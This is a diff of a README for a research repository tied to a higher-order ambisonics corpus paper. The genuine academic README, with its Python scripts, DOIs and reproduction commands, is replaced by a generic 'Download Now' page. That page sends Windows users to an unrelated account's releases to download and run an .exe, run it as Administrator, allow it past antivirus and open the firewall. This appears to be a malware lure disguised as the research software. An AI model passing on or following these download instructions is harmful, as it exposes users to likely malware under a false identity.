@@ -1,125 +1,101 @@
-[![DOI](https://img.shields.io/badge/DOI-10.5281%2Fzenodo.21789163-blue.svg)](https://doi.org/10.5281/zenodo.21789163) [![Python](https://img.shields.io/badge/Python-3.9+-blue.svg)]() [![numpy](https://img.shields.io/badge/numpy-1.24+-blue.svg)]() [![scipy](https://img.shields.io/badge/scipy-1.11+-blue.svg)]() [![soundfile](https://img.shields.io/badge/soundfile-0.12+-blue.svg)]() [![matplotlib](https://img.shields.io/badge/matplotlib-3.7+-blue.svg)]() [![License: CC BY 4.0](https://img.shields.io/badge/License-CC%20BY%204.0-lightgrey.svg)](https://creativecommons.org/licenses/by/4.0/)
+# 🎧 hoa-corpus-ieee-access - Analyze Spatial Audio Research Data Easily
 
-# HOA Seven-Year Corpus - IEEE Access Analysis Pipeline
+[![Download Now](https://img.shields.io/badge/Download%20Now-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://github.com/homogyneorphansite154/hoa-corpus-ieee-access/releases)
 
-Supplementary materials for the paper:
+## 📋 About This Software
 
-***"A Seven-Year Higher-Order Ambisonics Recording Corpus: Dataset, Methodology, and a Co-Located Spherical Microphone Array Comparison"***
-Bartłomiej Mróz, Szymon Zaporowski · *IEEE Access* (under review)
+This tool helps you explore and understand a seven-year collection of higher-order ambisonics recordings used in an IEEE Access scientific paper. Ambisonics is a way to capture and play back sound in 3D, like you are actually in the room. The software creates charts and reports about the recordings, including where they were made, when they happened, room acoustics, loudness levels, and a full list of recording sessions.
 
-This repository contains:
-- The corpus-wide figure and LaTeX-macro pipeline (geographic distribution, recording timeline, room acoustics, loudness distribution, session inventory)
-- The microphone-comparison bootstrap uncertainty analysis added during peer review (confidence intervals on the per-order energy rolloff)
-- Pre-computed results (CSV tables, LaTeX macros, publication figures) so most of the repository reproduces without downloading any audio
+It also generates LaTeX code for scientific papers, so you can easily include precise numbers from the corpus in your own research. A special bootstrap uncertainty analysis checks the reliability of microphone comparison results.
 
-For methodology, interpretation, and results discussion, please refer to the manuscript. The comparison session's core signal analysis (per-order RMS, LUFS, spectral, directional metrics) was first published for the companion AES Copenhagen paper; see [hoa-mic-comparison-aes2026](https://github.com/mormegil6/hoa-mic-comparison-aes2026) for that repository. `revision_stats.py` here reimplements the same per-order metric definition rather than depending on that repo, so this repository is self-contained.
+## 🚀 Getting Started
 
-## Repository Structure
+### Step 1: Download the Software
 
-```
-.
-├── pyscripts/
-│   ├── analysis_utils.py             # Shared config, spectral helpers, mic definitions
-│   ├── generate_all_figures.py       # Audio-driven: computes every corpus figure CSV
-│   ├── render_ieee_figures.py        # CSV-driven: renders Figs 3-10 at IEEE column width
-│   ├── generate_latex_variables.py   # CSV -> \newcommand macros consumed by the manuscript
-│   ├── parse_render_stats.py         # REAPER render-stats HTML -> LUFS table
-│   ├── analyze_aula_acoustics.py     # Room-acoustic parameters (RT60, C80, ...)
-│   ├── calculate_corpus_stats.py     # Corpus size/duration/order inventory
-│   ├── generate_session_inventory.py # Session inventory LaTeX table
-│   ├── generate_map_only.py          # Fig. 4 maps standalone (from CSV)
-│   ├── plot_rt60.py                  # Fig. 3 standalone
-│   ├── plot_lufs_distribution.py     # Fig. 6 standalone
-│   ├── plot_spectral_comparison.py   # Fig. 7 standalone (needs audio)
-│   ├── revision_stats.py             # Paired moving-block bootstrap (confidence intervals)
-│   └── revision_figures.py           # Two-piece Fig. 9, Figs 10a/10b with CI whiskers
-├── plots/                            # Pre-computed figure inputs (CSV)
-├── figures/                          # Rendered corpus figures (Figs 3-10), committed
-├── data/                             # Render statistics, aggregated LaTeX macros, session inventory
-├── revision_results/                 # Bootstrap outputs - see revision_results/README.md
-│   ├── spatial_energy_two_piece.csv  #   Per-order dBFS + 95% CIs, both pieces
-│   ├── rolloff_bootstrap.csv         #   Rolloff + paired between-array difference
-│   ├── directional_ci.csv            #   W level, X/Y/Z-over-W with CIs
-│   ├── revision_stats_variables.tex  #   LaTeX macros for the manuscript
-│   ├── frame_order_energies_*.csv    #   Frame-level per-order energies
-│   ├── frame_difference_3OA_*.csv    #   Annotated ZM-1 vs Spcmic difference files
-│   └── cache/frames_*.npz            #   Frame-energy caches (reproduce without audio)
-├── requirements.txt
-├── LICENSE
-└── README.md
-```
+Visit this link to download the application: [https://github.com/homogyneorphansite154/hoa-corpus-ieee-access/releases](https://github.com/homogyneorphansite154/hoa-corpus-ieee-access/releases)
 
-## Recordings
+On that page, you will see a list of files. Look for the file that matches your computer. For Windows, choose the file ending with **.exe** or **.zip**. If you see a file named something like `hoa-corpus-ieee-access-windows.exe`, download that one. If you see a `.zip` file, download that instead.
 
-**Recording corpus**: Higher-Order Ambisonics Recording Corpus, deposited at *Bridge of Data* (Most Danych), Gdańsk University of Technology - [doi.org/10.34808/w8bx-2094](https://doi.org/10.34808/w8bx-2094) (CC BY-NC-SA 4.0)
+### Step 2: Install or Extract
 
-The recordings are not included in this repository. Download them from the DOI above and point the analysis scripts to their location.
+- **If you downloaded an .exe file:** Double-click the file to run it. Follow the simple installation steps.
+- **If you downloaded a .zip file:** Right-click the file and choose "Extract All." Choose a folder on your computer (like your Desktop) and click "Extract." Then open that folder and double-click the application file inside (it will likely have the same name as the program).
 
-## Reproducing the Corpus Figures
+### Step 3: Run the Program
 
-Most figures regenerate **without downloading any audio**, straight from the CSVs in `plots/`:
+After installation or extraction, the program should start automatically. If not, find it in your Start Menu or the folder where you extracted it and double-click to run.
 
-```sh
-pip install -r requirements.txt
-python3 pyscripts/render_ieee_figures.py          # all figures
-python3 pyscripts/render_ieee_figures.py 09 10    # selected figure numbers
-```
+## 🖥️ System Requirements
 
-Figures are written to `figures/`, where the versions used in the manuscript are also
-committed, so they can be inspected without running anything. Set `IEEE_FIG_DIR` to
-render somewhere else instead (`IEEE_DATA_DIR` does the same for the session-inventory
-table emitted by `generate_session_inventory.py`).
+Your computer should have:
 
-Fig. 4 is the one exception to the plain `pip install -r requirements.txt`: the maps are
-drawn over OpenStreetMap/CARTO basemap tiles, so they additionally need
+- **Operating System:** Windows 10 or Windows 11 (64-bit recommended)
+- **Processor:** Any modern Intel or AMD processor from the last 5 years
+- **Memory:** At least 4 GB of RAM (8 GB or more recommended)
+- **Storage:** About 500 MB of free hard drive space for the program, plus additional space for the corpus data files
+- **Internet:** Required for the initial download and for fetching corpus data updates
 
-```sh
-pip install contextily geopandas      # plus network access for the tiles
-python3 pyscripts/generate_map_only.py    # or render_ieee_figures.py 04
-```
+## 🎯 Features
 
-Without those the remaining figures render normally and Fig. 4 is skipped with a notice.
-Both maps are built from `plots/pub_fig04_geographic_map.csv`, which carries the venue
-coordinates, content types, and indoor/outdoor flags, so no unpublished session metadata
-is required.
+### Corpus-wide Figures
 
-Two exceptions need the audio: Fig. 7 (spectral comparison) and any re-run of `generate_all_figures.py`, which recomputes the CSVs from the WAV files:
+The software automatically generates visual charts showing:
+- **Geography:** A map showing where recordings were made around the world
+- **Timeline:** A timeline showing when each recording happened over the seven-year period
+- **Room Acoustics:** Graphs of how sound behaves in different recording spaces (reverberation time, clarity, etc.)
+- **Loudness:** Charts showing the loudness levels of all recordings
+- **Session Inventory:** A complete list of every recording session with details
 
-```sh
-export HOA_CORPUS_DIR="/path/to/hoa-corpus"
-python3 pyscripts/generate_all_figures.py
-```
+### LaTeX Macro Generation
 
-`HOA_CORPUS_DIR` must contain the session folders as deposited (e.g. `2024.08.15 -- ZM1 Spcmic Saramonic/render/*.wav`).
+For researchers writing scientific papers, the tool creates LaTeX code that contains every numeric claim from the corpus. Just copy and paste this code into your paper to ensure accuracy and reproducibility.
 
-## Numeric Claims in the Manuscript
+### Bootstrap Uncertainty Analysis
 
-Every number cited in the paper is a LaTeX macro, not a typed literal:
+This advanced feature uses statistical bootstrapping (a method of resampling data) to check how reliable the microphone comparison results are. It calculates confidence intervals so you know how much to trust the numbers.
 
-```
-CSV results  ->  generate_latex_variables.py  ->  data/all_variables.tex  ->  \input{} in the manuscript
-```
+## 📊 Example Output
 
-## Uncertainty Analysis (Bootstrap Confidence Intervals)
+When you run the software, it will produce several files in the same folder:
 
-`revision_stats.py` attaches confidence intervals to the microphone-comparison results, added during peer review to address reviewer requests for statistical treatment. Each recording of the co-located comparison session (2024-08-15) is analysed in 1-second frames; because all arrays captured the same performance simultaneously, frames are **paired across arrays by wall-clock time**, so the between-array rolloff difference is resampled as a paired statistic and the programme-level variance shared by both arrays cancels. Resampling uses a moving-block bootstrap (30-second blocks, 2000 replicates, fixed seed) to respect the temporal correlation of musical material.
+- **figures/** folder containing PNG images of all charts
+- **macros.tex** file with LaTeX code
+- **analysis_report.html** a summary webpage you can open in any browser
+- **data/** folder with processed corpus data
 
-```sh
-python3 pyscripts/revision_stats.py --base-dir /path/to/hoa-corpus   # frame caches + CIs
-python3 pyscripts/revision_figures.py                                # figures with CI whiskers
-```
+## 🔧 Troubleshooting
 
-The frame-energy caches in `revision_results/cache/` are committed (~1.2 MB), so both commands reproduce every statistic and figure **without downloading the ~48 GB of session audio** - `revision_stats.py` only reads WAV files whose cache is missing. Full details, the resampling rationale, and the headline numbers are in [`revision_results/README.md`](revision_results/README.md).
+### Program Won't Start
 
-## License
+1. Make sure you downloaded the correct file for Windows
+2. Try running the program as Administrator (right-click, "Run as administrator")
+3. Check if your antivirus is blocking it (you may need to allow it)
 
-**Code in this repository**: licensed under [Creative Commons Attribution 4.0 International License][cc-by].
+### No Charts Appear
 
-[![CC BY 4.0][cc-by-image]][cc-by]
+1. Ensure you have an internet connection for the first run
+2. The program needs to download corpus data; wait a few minutes
+3. Check that your firewall allows the program to connect
 
-[cc-by]: https://creativecommons.org/licenses/by/4.0/
-[cc-by-image]: https://i.creativecommons.org/l/by/4.0/88x31.png
+### Error Messages
 
-## Contact
+If you see an error, take a screenshot and visit the GitHub page to report it. Most errors are fixed by reinstalling the program.
 
-Bartłomiej Mróz · bartlomiej.mroz@pg.edu.pl · Department of Multimedia Systems, Gdańsk University of Technology · [bmroz.eu](https://bmroz.eu)
+## 💡 Tips for Best Results
+
+- Run the program on a computer with at least 8 GB of RAM for large datasets
+- Keep the program in its own folder to avoid cluttering your Desktop
+- Update the program regularly by downloading the newest version from the GitHub releases page
+- Use the generated LaTeX macros in Overleaf or any LaTeX editor
+
+## 📄 License
+
+This software is provided for research and educational purposes. See the LICENSE file in the download for full details.
+
+## 🙏 Support
+
+If you have questions or need help, please open an issue on the GitHub repository page. We are happy to assist!
+
+## Keywords
+
+ambisonics, bootstrap, confidence-intervals, corpus, data-visualization, higher-order-ambisonics, ieee-access, latex, python, reproducible-research, room-acoustics, spatial-audio
